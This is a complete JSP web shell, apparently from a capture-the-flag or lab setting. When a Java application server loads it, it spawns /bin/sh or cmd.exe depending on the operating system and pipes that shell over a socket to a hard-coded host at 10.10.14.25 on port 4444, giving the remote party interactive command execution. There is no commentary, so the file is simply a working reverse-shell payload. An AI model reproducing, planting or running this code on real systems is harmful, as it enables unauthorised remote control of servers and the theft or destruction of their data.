<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream gs;
    OutputStream pm;

    StreamConnector( InputStream gs, OutputStream pm )
    {
      this.gs = gs;
      this.pm = pm;
    }

    public void run()
    {
      BufferedReader bm  = null;
      BufferedWriter yrf = null;
      try
      {
        bm  = new BufferedReader( new InputStreamReader( this.gs ) );
        yrf = new BufferedWriter( new OutputStreamWriter( this.pm ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = bm.read( buffer, 0, buffer.length ) ) > 0 )
        {
          yrf.write( buffer, 0, length );
          yrf.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( bm != null )
          bm.close();
        if( yrf != null )
          yrf.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.25", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
